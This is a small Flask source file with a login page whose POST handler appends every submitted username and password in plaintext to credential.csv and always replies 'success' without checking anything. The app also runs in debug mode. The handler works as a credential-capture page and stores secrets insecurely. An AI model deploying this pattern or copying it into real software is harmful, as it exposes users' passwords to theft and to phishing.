from flask import Flask,redirect,jsonify,request,url_for,render_template
import csv

app = Flask(__name__)

# from jinja2 import Environment, FileSystemLoader

# template_dir = "templates"  # Replace with the actual path to your templates directory
# env = Environment(loader=FileSystemLoader(template_dir))

# import os

# print(os.getcwd())

@app.route("/")

def login_file():
    return render_template("login.html")


@app.route("/login",methods = ["POST"])

def login():
    username = request.form.get("username")
    password = request.form.get("password")
    
    with open("credential.csv", "a+") as f:
        a = csv.writer(f)
        a.writerow([username,password])

    return jsonify({
        "status" : "success"
    })


app.run(debug = True)









